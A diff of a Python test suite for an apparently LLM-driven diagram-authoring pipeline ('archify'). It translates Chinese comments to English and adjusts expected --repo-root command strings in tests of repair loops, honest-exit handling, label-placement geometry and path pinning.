     cli = make_cli_stub(
         validate_receipts=[_pass_receipt()],
@@ -833,8 +904,9 @@ def test_percept_skipped_without_evidence(pattern, workspace):
 
 
 def test_percept_skipped_when_sidecar_files_missing(pattern, workspace):
-    """回执列出截图但磁盘缺失(显式回执桩不落盘):按文件存在性核对,
-    全缺 → 诚实 skipped,绝不评审不存在的截图。"""
+    """Receipt lists screenshots missing on disk (the explicit receipt stub
+    writes nothing): checked by file existence, all missing -> honest
+    skipped, never review screenshots that do not exist."""
     provider = ArchifyScriptedProvider()
     cli = make_cli_stub(
         validate_receipts=[_pass_receipt()],
@@ -847,8 +919,9 @@ def test_percept_skipped_when_sidecar_files_missing(pattern, workspace):
 
 
 def test_percept_skipped_when_model_not_vision(pattern, workspace):
-    """注册表声明评审模型无图像能力(zai/glm-5.3 非视觉):按契约不向
-    纯文本模型发送图像,诚实 skipped(image reader unavailable 词表)。"""
+    """The registry declares the reviewer model has no vision (zai/glm-5.3
+    is not a vision model): by contract no images go to a text-only model,
+    honest skipped ("image reader unavailable" wording)."""
     provider = ArchifyScriptedProvider()
     cli = make_cli_stub(validate_receipts=[_pass_receipt()], calls=[])
     session, reply = run_turn(
@@ -863,9 +936,10 @@ def test_percept_skipped_when_model_not_vision(pattern, workspace):
 
 
 def test_percept_output_self_corrects_then_degrades(pattern, workspace):
-    """判定 JSON 解析失败:坏输出+错误回填 → 自纠重试成功;始终不可解析
-    → 诚实 skipped(绝不编造通过)。"""
-    # 1) 首次坏输出,自纠成功
+    """Verdict JSON parse failure: bad output + error feedback -> the
+    self-correction retry succeeds; permanently unparseable -> honest
+    skipped (never fabricates a pass)."""
+    # 1) First output is bad, self-correction succeeds
     provider = ArchifyScriptedProvider(percept_outputs=[
         "我觉得整体不错,没有明显问题。",
         json.dumps({"status": "passed", "defects": [],
@@ -875,12 +949,12 @@ def test_percept_output_self_corrects_then_degrades(pattern, workspace):
     assert provider.percept_calls == 2
     assert "感知审查: passed" in reply
 
-    # 2) 永远不可解析 → 自纠耗尽 → skipped
+    # 2) Never parseable -> self-correction exhausted -> skipped
     provider2 = ArchifyScriptedProvider(percept_outputs=[
         "挺好的", "还是挺好"])
     cli2 = make_cli_stub(validate_receipts=[_pass_receipt()], calls=[])
     session2, reply2 = run_turn(pattern, provider2, cli2)
-    assert provider2.percept_calls == 2  # 首败 + 自纠(均失败)
+    assert provider2.percept_calls == 2  # first failure + self-correction (both fail)
     assert "感知审查: skipped(评审输出不可解析为判定 JSON)" in reply2
     trace = app_trace_of(session2)
     assert trace["percept_receipt"]["status"] == "skipped"
@@ -888,11 +962,12 @@ def test_percept_output_self_corrects_then_degrades(pattern, workspace):
 
 
 # ============================================================================
-# 6b. Repository evidence (仓库证据:--repo-root 条件化拼装)
+# 6b. Repository evidence (--repo-root assembled conditionally)
 # ============================================================================
 
-# 声明仓库证据的 architecture 候选(studio 实跑死锁形态:声明 sources →
-# validate 要求 --repo-root,不传则 6 轮全卡 root-required 不可修复)
+# Architecture candidate declaring repository evidence (studio deadlock
+# shape: declares sources -> validate demands --repo-root; without it all
+# 6 rounds stick on root-required, unrepairable)
 _EVIDENCE_CANDIDATE_JSON = json.dumps(
     {"schema_version": 1, "diagram_type": "architecture",
      "meta": {"title": "运行时架构", "quality_profile": "showcase",
@@ -907,23 +982,24 @@ _EVIDENCE_CANDIDATE_JSON = json.dumps(
 
 
 def test_repo_root_flag_conditional(workspace, monkeypatch):
-    """_repo_root_flag 判定:仅 architecture 且候选声明证据时非空
-    (CLI 对非 architecture 拒绝该旗标;无证据时核验器直接跳过)。"""
+    """_repo_root_flag decision: non-empty only for architecture with the
+    candidate declaring evidence (the CLI rejects the flag for
+    non-architecture; without evidence the verifier skips outright)."""
     monkeypatch.setattr(ax, "_DEFAULT_REPO_ROOT", "/ev/root")
     cand = workspace[0] / "s1" / "c.json"
     cand.parent.mkdir(parents=True, exist_ok=True)
     state = {"diagram_type": "architecture", "candidate_path": str(cand)}
 
     cand.write_text(_EVIDENCE_CANDIDATE_JSON, encoding="utf-8")
-    assert ax._repo_root_flag(state) == ' --repo-root "/ev/root"'
+    assert ax._repo_root_flag(state) == ' --repo-root /ev/root'
 
-    # 仅组件 sources(无 meta.repository)同样算声明证据
+    # Component-level sources alone (no meta.repository) also count as declared evidence
     data = json.loads(_EVIDENCE_CANDIDATE_JSON)
     del data["meta"]["repository"]
     cand.write_text(json.dumps(data, ensure_ascii=False), encoding="utf-8")
-    assert ax._repo_root_flag(state) == ' --repo-root "/ev/root"'
+    assert ax._repo_root_flag(state) == ' --repo-root /ev/root'
 
-    # architecture 无证据 / 非 architecture(即使带证据字段)/ 候选缺失
+    # architecture without evidence / non-architecture (even with evidence fields) / missing candidate
     data["components"][0].pop("sources")
     cand.write_text(json.dumps(data, ensure_ascii=False), encoding="utf-8")
     assert ax._repo_root_flag(state) == ""
@@ -937,9 +1013,10 @@ def test_repo_root_flag_conditional(workspace, monkeypatch):
 
 def test_repo_evidence_commands_carry_repo_root(pattern, workspace,
                                                 monkeypatch):
-    """声明证据的 architecture 候选:validate/deliver 命令拼 --repo-root
-    (root-required 死锁的解锁口,核验器得以用真 git 裁决并给出可修复
-    诊断);workflow 候选不带旗标。"""
+    """Architecture candidate declaring evidence: validate/deliver commands
+    append --repo-root (the unlock for the root-required deadlock, letting
+    the verifier adjudicate with real git and emit repairable diagnostics);
+    workflow candidates carry no flag."""
     monkeypatch.setattr(ax, "_DEFAULT_REPO_ROOT", "/repo/ev")
     provider = ArchifyScriptedProvider(
         candidate=_EVIDENCE_CANDIDATE_JSON, route_type="architecture")
@@ -949,10 +1026,10 @@ def test_repo_evidence_commands_carry_repo_root(pattern, workspace,
 
     vcmd = next(c for c in calls if "archify.mjs validate " in c)
     dcmd = next(c for c in calls if "archify.mjs deliver " in c)
-    assert '--repo-root "/repo/ev"' in vcmd
-    assert '--repo-root "/repo/ev"' in dcmd
+    assert '--repo-root /repo/ev' in vcmd
+    assert '--repo-root /repo/ev' in dcmd
 
-    # 对照:workflow 候选(默认)不拼旗标
+    # Contrast: the workflow candidate (default) gets no flag
     provider2 = ArchifyScriptedProvider()
     calls2 = []
     cli2 = make_cli_stub(validate_receipts=[_pass_receipt()], calls=calls2)
@@ -962,8 +1039,10 @@ def test_repo_evidence_commands_carry_repo_root(pattern, workspace,
 
 def test_repair_self_validate_carries_repo_root(pattern, workspace,
                                                 monkeypatch):
-    """修复站的站内自验命令同步带旗标:模型自验看到的回执与验证闸门
-    同源(否则闸门 root-required、自验却过,修复站原地打转)。"""
+    """The repair station's in-station self-check commands carry the flag
+    too: the receipt the model sees during self-check shares provenance
+    with the validation gate (otherwise the gate says root-required while
+    self-check passes, and the repair station spins in place)."""
     monkeypatch.setattr(ax, "_DEFAULT_REPO_ROOT", "/repo/ev")
     provider = ArchifyScriptedProvider(
         candidate=_EVIDENCE_CANDIDATE_JSON, route_type="architecture")
@@ -977,7 +1056,7 @@ def test_repair_self_validate_carries_repo_root(pattern, workspace,
               if kind == "repair" and len(msgs) == 2]
     assert frames
     assert any("--repo-root" in f for f in frames)
-    # 证据诊断的修复指引也在 framing 里(修 meta.repository 或删 sources)
+    # The evidence diagnostic's repair guidance is in the framing too (fix meta.repository or drop sources)
     assert any("repository-evidence" in f for f in frames)
 
 
@@ -988,40 +1067,44 @@ def test_repair_self_validate_carries_repo_root(pattern, workspace,
 def test_trailing_stale_semantics():
     f = ax._trailing_stale
     assert f([]) == 0
-    assert f([5]) == 0            # 首轮是基线
+    assert f([5]) == 0            # first round is the baseline
     assert f([5, 5]) == 1
-    assert f([5, 5, 5]) == 2      # 触发诚实出口
-    assert f([5, 3, 4]) == 1      # 4 未刷新 min(5,3)=3
-    assert f([5, 3, 4, 2]) == 0   # 新下限重置
+    assert f([5, 5, 5]) == 2      # triggers the honest exit
+    assert f([5, 3, 4]) == 1      # 4 does not refresh min(5,3)=3
+    assert f([5, 3, 4, 2]) == 0   # a new minimum resets the count
     assert f([3, 3, 2]) == 0
 
 
 def test_clearance_moves_geometry():
-    """求解器几何:四向挪移按 |delta| 升序(就近优先),超限丢弃。
+    """Solver geometry: four-directional moves sorted by ascending |delta|
+    (nearest first), out-of-range moves dropped.
 
-    studio 实跑回归数字:48px 标签 rect [640.8, 233, 48.4, 14] 挤在
-    x=665 竖直路由段(y 110→239)旁——上移 -143 超限丢弃,正确解
-    labelDy +12 恰好排第一(左移 -30.2 会撞组件,由真验证器否决)。"""
-    # 竖直线段:左右让出 x + 上下出段 y 覆盖
+    Regression numbers from a real studio run: the 48px label rect
+    [640.8, 233, 48.4, 14] squeezed next to the vertical route segment at
+    x=665 (y 110->239) — moving up -143 is out of range and dropped; the
+    correct fix labelDy +12 happens to rank first (moving left -30.2 would
+    hit a component and is vetoed by the real validator)."""
+    # Vertical segment: yield x left/right + extend past the segment ends in y
     moves = ax._clearance_moves((640.8, 233.0, 48.4, 14.0),
                                 (665.0, 110.0, 665.0, 239.0), 4)
     assert moves == [{"dy": 12.0}, {"dx": -30.2}, {"dx": 30.2}]
 
-    # 水平线段:上下让出 y + 左右出段 x 覆盖(对称语义)
+    # Horizontal segment: yield y up/down + extend past the segment ends in x (symmetric semantics)
     moves = ax._clearance_moves((100.0, 200.0, 40.0, 14.0),
                                 (90.0, 240.0, 300.0, 240.0), 4)
     assert {"dy": 20.0} in moves and {"dy": -60.0} not in moves
 
-    # 已净空 <1px 的方向过滤为噪声;全部超限 → 空(交布局级杠杆)
+    # Directions already clear (<1px) are filtered as noise; all out of range -> empty (defer to layout-level levers)
     assert ax._clearance_moves((0.0, 0.0, 40.0, 14.0),
                                (1000.0, -500.0, 1000.0, 500.0), 4) == []
 
 
 def test_label_solver_targets_forms():
-    """目标提取的两种形态:label-route-clearance 走结构化 evidence(消息
-    文本兜底),组件重叠解析 Suggested fix 的 below/above 两个绝对点;
-    无关诊断零目标。"""
-    # 形态 1:结构化 evidence + subject.index
+    """Two target-extraction shapes: label-route-clearance uses structured
+    evidence (message text as fallback); component overlap parses the
+    below/above absolute points from "Suggested fix"; unrelated diagnostics
+    yield zero targets."""
+    # Shape 1: structured evidence + subject.index
     state = {"last_receipt": {"diagnostics": [{
         "code": "composition/label-route-clearance",
         "severity": "error",
@@ -1039,7 +1122,7 @@ def test_label_solver_targets_forms():
     assert targets[0]["label"] == "读写邮件"
     assert targets[0]["moves"][0] == {"dy": 12.0}
 
-    # 形态 1 兜底:只有消息文本(旧回执/摘要降级),正则同样解出几何
+    # Shape 1 fallback: message text only (old receipt / summary degradation); the regex still extracts the geometry
     state = {"last_receipt": {"diagnostics": [{
         "code": "composition/label-route-clearance",
         "severity": "error",
@@ -1050,7 +1133,7 @@ def test_label_solver_targets_forms():
     assert len(targets) == 1
     assert targets[0]["moves"] == [{"dy": 12.0}, {"dx": -30.0}, {"dx": 30.0}]
 
-    # 形态 2:组件重叠的两个建议点(below 在前,渲染器建议序)
+    # Shape 2: the two suggested points of component overlap (below first, renderer's suggested order)
     state = {"last_receipt": {"diagnostics": [{
         "code": "layout/constraint", "severity": "error",
         "message": ('Label "邮件操作请求" overlaps component "user" —'
@@ -1065,7 +1148,7 @@ def test_label_solver_targets_forms():
                         "moves": [{"abs": [180.0, 258.0]},
                                   {"abs": [180.0, 180.0]}]}]
 
-    # 无建议坐标 / 无关诊断 → 零目标(LLM 微循环的领地)
+    # No suggested coordinates / unrelated diagnostics -> zero targets (the LLM micro-loop's territory)
     state = {"last_receipt": {"diagnostics": [
         {"code": "layout/constraint", "severity": "error",
          "message": 'Label "CLI 命令" overlaps component "cli"'},
@@ -1075,8 +1158,10 @@ def test_label_solver_targets_forms():
 
 
 def test_apply_label_move_semantics():
-    """挪移落位:绝对点写 labelAt;增量优先折进已有 labelAt,否则累加
-    labelDx/labelDy(与 supportedFixes 的字段语义一致)。"""
+    """Applying a move: an absolute point writes labelAt; a delta folds
+    into an existing labelAt first, otherwise accumulates into
+    labelDx/labelDy (consistent with the supportedFixes field
+    semantics)."""
     conns = [{"from": "a", "to": "b", "label": "L"},
              {"from": "c", "to": "d", "label": "M", "labelAt": [552.0, 154.0]},
              {"from": "e", "to": "f", "label": "N", "labelDx": 5.0}]
@@ -1085,11 +1170,11 @@ def test_apply_label_move_semantics():
     assert conns[0]["labelAt"] == [180.0, 258.0]
     assert ax._apply_label_move(conns, {"index": 1, "label": "M"},
                                 {"dy": 12.0})
-    assert conns[1]["labelAt"] == [552.0, 166.0]  # 折进 labelAt
+    assert conns[1]["labelAt"] == [552.0, 166.0]  # folded into labelAt
     assert ax._apply_label_move(conns, {"index": 2, "label": "N"},
                                 {"dx": -30.0})
-    assert conns[2]["labelDx"] == -25.0           # 累加
-    # 越界 index / 标签失配 → 拒绝落位
+    assert conns[2]["labelDx"] == -25.0           # accumulated
+    # Out-of-range index / label mismatch -> move refused
     assert not ax._apply_label_move(conns, {"index": 9, "label": "X"},
                                     {"dy": 1.0})
 
@@ -1097,10 +1182,10 @@ def test_apply_label_move_semantics():
 def test_receipt_metrics():
     assert ax._receipt_error_count(_pass_receipt()) == 0
     assert ax._receipt_error_count(_fail_receipt(2)) == 2
-    # ok:false 无诊断/检查 → 下限 1(绝不无中生有地"通过")
+    # ok:false with no diagnostics/checks -> floor of 1 (never conjure a "pass" out of nothing)
     assert ax._receipt_error_count({"ok": False}) == 1
     assert ax._receipt_error_count({"ok": False, "error": "boom"}) == 1
-    # showcase 判定:ok + 恰 9 项全过 + 无警告;4 项回执不算验收
+    # showcase verdict: ok + exactly 9 checks all passing + no warnings; a 4-check receipt is not acceptance
     assert ax._is_showcase_pass(_pass_receipt())
     assert not ax._is_showcase_pass(
         {"ok": True, "checks": [{"ok": True}] * 4, "warnings": []})
@@ -1112,21 +1197,24 @@ def test_receipt_metrics():
 
 
 def test_missing_candidate_recorded_without_bash(pattern, workspace):
-    """创作站未写出候选:验证闸门记客观错误(不跑 bash),修复回路接管;
-    修复兜不住时按收敛契约诚实退出(绝不伪造候选或宣称成功)。"""
+    """The author station wrote no candidate: the validation gate records
+    the objective error (no bash run) and the repair loop takes over; when
+    repair cannot save it, the convergence contract exits honestly (never
+    fabricates a candidate or claims success)."""
     provider = ArchifyScriptedProvider(candidate_write=False, repair_edits=5)
     calls = []
     cli = make_cli_stub(validate_receipts=[], calls=calls)
     session, reply = run_turn(pattern, provider, cli)
 
-    # 候选缺失 → validate 六次都不执行 bash,直接记 author/missing-candidate
+    # Missing candidate -> all six validate calls skip bash, recording author/missing-candidate directly
     assert not any("validate" in c for c in calls)
     trace = app_trace_of(session)
     assert trace["val_history"] == [1] * 6
     assert trace["last_receipt"]["diagnostics"][0][
         "code"] == "author/missing-candidate"
-    # 修复站五次访问均未能写出候选(edit_file 对不存在文件报错回填),
-    # 第六访被收敛闸门拦截 → 诚实出口
+    # All five repair visits fail to write a candidate (edit_file errors on
+    # the missing file and feeds it back); the sixth visit is stopped by the
+    # convergence gate -> honest exit
     assert provider.repair_calls == 9
     assert trace["repair_rounds"] == 5
     assert trace["honest_exit"] is True
@@ -1134,69 +1222,75 @@ def test_missing_candidate_recorded_without_bash(pattern, workspace):
 
 
 def test_route_parse_failure_self_corrects(pattern, workspace):
-    """路由 JSON 首次解析失败:坏输出+错误回填 → 自纠重试成功(不降级)。"""
+    """First route-JSON parse failure: bad output + error feedback -> the self-correction retry succeeds (no degradation)."""
     provider = ArchifyScriptedProvider(route_fail_first=True)
     calls = []
     cli = make_cli_stub(validate_receipts=[_pass_receipt()], calls=calls)
     session, reply = run_turn(pattern, provider, cli)
 
-    assert provider.route_calls == 2  # 首败 + 自纠重试
+    assert provider.route_calls == 2  # first failure + self-correction retry
     trace = app_trace_of(session)
     assert trace["degraded"] is False
     assert trace["diagram_type"] == "workflow"
 
 
 def test_route_parse_failure_degrades(pattern, workspace):
-    """路由 JSON 永远解析失败:自纠耗尽 → 降级 workflow(degraded 标记),
-    流程不因路由失败死锁。"""
+    """Route JSON never parses: self-correction exhausted -> degrade to
+    workflow (degraded flag); the flow does not deadlock on route
+    failure."""
     provider = ArchifyScriptedProvider(route_fail_always=True)
     calls = []
     cli = make_cli_stub(validate_receipts=[_pass_receipt()], calls=calls)
     session, reply = run_turn(pattern, provider, cli)
 
-    assert provider.route_calls == 2  # 首败 + 自纠重试(均失败)
+    assert provider.route_calls == 2  # first failure + self-correction retry (both fail)
     trace = app_trace_of(session)
     assert trace["degraded"] is True
     assert trace["diagram_type"] == "workflow"
 
 
 def test_author_write_path_drift_adopted(pattern, workspace):
-    """创作站写入路径漂移收编(studio 实跑回归):
+    """Adopting the author station's drifted write path (studio regression):
 
-    模型把候选写到了自选路径而非 candidate_path——执行器从本轮
-    write_text 调用中收编最后一个可解析内容,钉回 candidate_path
-    (内容归模型、落位归执行器),流程继续走验证。
+    The model wrote the candidate to a self-chosen path instead of
+    candidate_path — the executor adopts the last parseable content from
+    this round's write_text calls and pins it back to candidate_path
+    (content belongs to the model, placement to the executor), and the flow
+    proceeds to validation.
     """
     root, skill = workspace
-    wrong = str(root / "my-own-choice.json")   # 模型自选的错路径(绝对)
+    wrong = str(root / "my-own-choice.json")   # the model's self-chosen wrong path (absolute)
     provider = ArchifyScriptedProvider(write_path=wrong)
     calls = []
     cli = make_cli_stub(validate_receipts=[_pass_receipt()], calls=calls)
     session, reply = run_turn(pattern, provider, cli)
 
-    # 错路径真实落盘;收编后 candidate_path 同样有货且可解析
+    # The wrong path really lands on disk; after adoption candidate_path also holds parseable content
     assert Path(wrong).exists()
     cand = _candidate_path()
     data = json.loads(Path(cand).read_text(encoding="utf-8"))
     assert data["meta"]["quality_profile"] == "showcase"
-    # 命中的是错路径的内容(validate 命令内嵌 candidate_path 绝对路径)
+    # What gets validated is the wrong path's content (the validate command embeds the candidate_path absolute path)
     vcmd = next(c for c in calls if "validate" in c)
     assert cand in vcmd
     assert "showcase 验收通过" in reply
     trace = app_trace_of(session)
-    assert "author" in trace["phases"]  # 未标记 author_failed
+    assert "author" in trace["phases"]  # not flagged author_failed
 
 
 def test_relative_workspace_root_pinned_absolute(pattern, workspace,
                                                  monkeypatch, tmp_path):
-    """相对工作区根必须钉成绝对路径(studio 实跑回归):
+    """A relative workspace root must be pinned absolute (studio regression):
 
-    file 工具按服务启动目录解析相对路径,archify CLI 经 bash 以
-    workdir=skill_dir 运行按技能目录解析——同一相对串两个上下文解析到
-    不同文件,验证站 ENOENT、修复站修到验证看不到的文件。状态板路径
-    一律绝对后,write_text 落盘与 validate 命令内嵌的是同一个文件。
+    The file tools resolve relative paths against the service startup
+    directory, while the archify CLI runs via bash with workdir=skill_dir
+    and resolves against the skill directory — the same relative string
+    resolves to different files in the two contexts, so validation hits
+    ENOENT and repair fixes a file validation cannot see. With state-board
+    paths always absolute, what write_text writes and what the validate
+    command embeds are the same file.
     """
-    # 相对根(带 .. 指回 tmp,不 chdir——file 工具的配置探测依赖 cwd)
+    # Relative root (with .. pointing back into tmp; no chdir — the file tools' config probing depends on cwd)
     import os
 
     rel_root = os.path.relpath(tmp_path / "relws", Path.cwd().resolve())
@@ -1210,20 +1304,22 @@ def test_relative_workspace_root_pinned_absolute(pattern, workspace,
     cand = Path(trace["candidate_path"])
     assert cand.is_absolute()
     assert cand.parent.parent == (tmp_path / "relws").resolve()
-    assert cand.exists()  # write_text 真实落盘的就是这个绝对路径
-    # validate 命令内嵌同一绝对路径(CLI 在 skill_dir 下运行也能读到)
+    assert cand.exists()  # this absolute path is exactly what write_text wrote
+    # The validate command embeds the same absolute path (readable even with the CLI running under skill_dir)
     vcmd = next(c for c in calls if "validate" in c)
     assert str(cand) in vcmd
     assert "showcase 验收通过" in reply
 
 
 # ============================================================================
-# 8. 思考流式上屏 + 修复站的创作上下文(本轮新增契约)
+# 8. Thinking streamed to the UI + the repair station's authoring context (contracts added this round)
 # ============================================================================
 
 class _ThinkingStreamProvider(ArchifyScriptedProvider):
-    """相位脚本不变,改为流式供给:首个 chunk 携带思考增量,正文拆两个
-    文本 chunk,tool_calls 原样作收尾 chunk(聚合器按 OpenAI 语义合并)。"""
+    """Phase scripting unchanged, now served as a stream: the first chunk
+    carries a thinking increment, the body splits into two text chunks, and
+    tool_calls ride the closing chunk as-is (the aggregator merges per
+    OpenAI semantics)."""
 
     async def achat_completion_stream(self, messages, model,
                                       temperature=0.7, max_tokens=2048,
@@ -1245,9 +1341,11 @@ class _ThinkingStreamProvider(ArchifyScriptedProvider):
 
 
 def test_thinking_streams_but_text_deltas_do_not(pattern, workspace):
-    """三个 LLM 站的思考增量以 thinking 事件流入 UI(此前发射器传 None,
-    UI 完全收不到);站内正文是协议 JSON/工作话术,forward_text=False
-    不上屏——done 的权威回复仍是回执组装的汇报。"""
+    """Thinking increments from the three LLM stations flow into the UI as
+    thinking events (previously the emitter passed None and the UI received
+    nothing); in-station bodies are protocol JSON / working wording and are
+    not displayed with forward_text=False — the authoritative done reply is
+    still the receipt-assembled report."""
     from nexus.engine.chat import chat_turn_stream
 
     provider = _ThinkingStreamProvider()
@@ -1267,17 +1365,21 @@ def test_thinking_streams_but_text_deltas_do_not(pattern, workspace):
 
     thinks = [e.text for e in events if e.kind == "thinking"]
     assert {t for t in thinks} >= {"[思考:route]", "[思考:author]"}
-    assert not [e for e in events if e.kind == "delta"]  # 正文不上屏
+    assert not [e for e in events if e.kind == "delta"]  # the body is not displayed
     done = events[-1]
     assert done.kind == "done"
-    assert "showcase 验收通过" in done.result.text  # 汇报组装不受影响
+    assert "showcase 验收通过" in done.result.text  # report assembly unaffected
 
 
 def test_repair_framing_carries_authoring_context(pattern, workspace):
-    """修复站提示词补回创作上下文(原 skill 的修复发生在创作同会话,拆站
-    后由状态板代偿):原始需求/创作备忘/类型放置纪律/结构化诊断(subject +
-    supportedFixes)/schema 与 authoring-contract 路径/--layout-json;第二
-    次访问能看到错误轨迹与第一次的动作摘要(防原样重演已失败动作)。"""
+    """The repair prompt restores the authoring context (in the original
+    skill, repair ran in the same session as authoring; after the station
+    split the state board compensates): original request / authoring memos /
+    type-placement discipline / structured diagnostics (subject +
+    supportedFixes) / schema and authoring-contract paths / --layout-json;
+    the second visit can see the error trajectory and the first visit's
+    action summary (preventing verbatim replays of already-failed
+    actions)."""
     provider = ArchifyScriptedProvider(repair_edits=2)
     calls = []
     receipts = [{
@@ -1292,8 +1394,9 @@ def test_repair_framing_carries_authoring_context(pattern, workspace):
     cli = make_cli_stub(validate_receipts=receipts, calls=calls)
     session, reply = run_turn(pattern, provider, cli)
 
-    # 每次修复访问的首轮请求才是完整 framing(仅 system+framing 两条);
-    # stale-5 下闸门前共五访
+    # Only the first-round request of each repair visit is the full framing
+    # (just system + framing, two messages); under stale-5 there are five
+    # visits before the gate
     frames = ["".join(str(m.get("content") or "") for m in msgs
                       if m.get("role") == "user")
               for kind, msgs in provider.requests
@@ -1310,12 +1413,12 @@ def test_repair_framing_carries_authoring_context(pattern, workspace):
                      "标签掩码宽"):
         assert fragment in first, fragment
     assert "客观错误数轨迹: [1]" in first
-    assert "(首轮修复" not in first  # 已有轨迹,无占位符
+    assert "(首轮修复" not in first  # trajectory already present, no placeholder
 
-    # 第二访:轨迹叠加 + 第一访摘要可见;stale=1 未达最后机会阈值
+    # Visit 2: trajectory accumulates + visit-1 summary visible; stale=1 below the last-chance threshold
     assert "客观错误数轨迹: [1, 1]" in second
     assert "最后机会" not in second
-    # 第五访:stale=4 = stale_limit-1 → 明示最后机会
+    # Visit 5: stale=4 = stale_limit-1 -> the last chance is stated explicitly
     assert ("客观错误数轨迹: [1, 1, 1, 1, 1]"
             "——已连续 4 轮未刷新下限") in last
     assert "最后机会" in last
@@ -1328,14 +1431,15 @@ def test_repair_framing_carries_authoring_context(pattern, workspace):
 
 
 # ============================================================================
-# 8. Phase 3 迁移:config bag 驱动预算 + 站点发布 pattern_code
+# 8. Phase 3 migration: config-bag-driven budgets + stations publishing pattern_code
 # ============================================================================
 
 def test_repair_budget_follows_app_config_bag(pattern, workspace, tmp_path,
                                               monkeypatch):
-    """apps/<name>/config.yaml 的 config.repair_rounds 覆盖代码默认(3):
-    同一 stale-5 场景,每次修复访问的内部微循环被截到 1 轮 LLM(对照
-    test_repair_honest_exit_after_stale_rounds 的 9 次 = 3+3+1+1+1)。"""
+    """config.repair_rounds from apps/<name>/config.yaml overrides the code
+    default (3): in the same stale-5 scenario, each repair visit's inner
+    micro-loop is cut to 1 LLM round (contrast
+    test_repair_honest_exit_after_stale_rounds's 9 = 3+3+1+1+1)."""
     from nexus import settings as nexus_settings
 
     apps_root = tmp_path / "apps"
@@ -1351,22 +1455,24 @@ def test_repair_budget_follows_app_config_bag(pattern, workspace, tmp_path,
                             calls=calls)
         session, reply = run_turn(pattern, provider, cli)
 
-        assert provider.author_calls == 4   # 未覆盖的键维持代码默认(10 不截)
+        assert provider.author_calls == 4   # uncovered keys keep the code default (10, uncapped)
         assert len([c for c in calls if "validate" in c]) == 6
-        assert provider.repair_calls == 5   # 5 次访问 × 每访 1 轮(覆盖生效)
+        assert provider.repair_calls == 5   # 5 visits x 1 round each (override in effect)
         trace = app_trace_of(session)
         assert trace["repair_rounds"] == 5
         assert trace["honest_exit"] is True
-        assert "连续 5 轮未刷新错误数下限" in reply  # stale_limit 未覆盖 → 默认 5
+        assert "连续 5 轮未刷新错误数下限" in reply  # stale_limit not overridden -> default 5
     finally:
         nexus_settings.invalidate_config_cache()
 
 
 def test_stations_publish_pattern_code(pattern, workspace):
-    """自定义站点绕过默认 loop executor,须自行发布工具调用位置:
-    _dispatch_tool_calls(语义站文件工具)与 _run_cli(确定性站 bash)两条
-    dispatch 路径里,处理器侧 ambient_pattern_code() 均应读到 "archify"——
-    它是 app 护栏覆盖的定位键(漏发 = 永远全局护栏)。"""
+    """Custom stations bypass the default loop executor and must publish
+    the tool-call location themselves: along both dispatch paths —
+    _dispatch_tool_calls (semantic-station file tools) and _run_cli
+    (deterministic-station bash) — the handler side's
+    ambient_pattern_code() should read "archify" — it is the lookup key for
+    app guardrail overrides (leaving it out = global guardrails forever)."""
     from nexus.engine.tool_context import ambient_pattern_code
 
     seen = []
@@ -1379,8 +1485,8 @@ def test_stations_publish_pattern_code(pattern, workspace):
 
     session, reply = run_turn(pattern, provider, spy)
 
-    # author 的 find/read/write(语义站)+ probe/validate/deliver/
-    # visual-check 的 bash(确定性站)全部命中且唯一为 archify
+    # author's find/read/write (semantic stations) + probe/validate/deliver/
+    # visual-check's bash (deterministic stations) all hit, uniquely archify
     assert len(seen) >= 7
     assert set(seen) == {"archify"}
-    assert "showcase 验收通过" in reply  # 全链路未受影响
+    assert "showcase 验收通过" in reply  # full pipeline unaffected
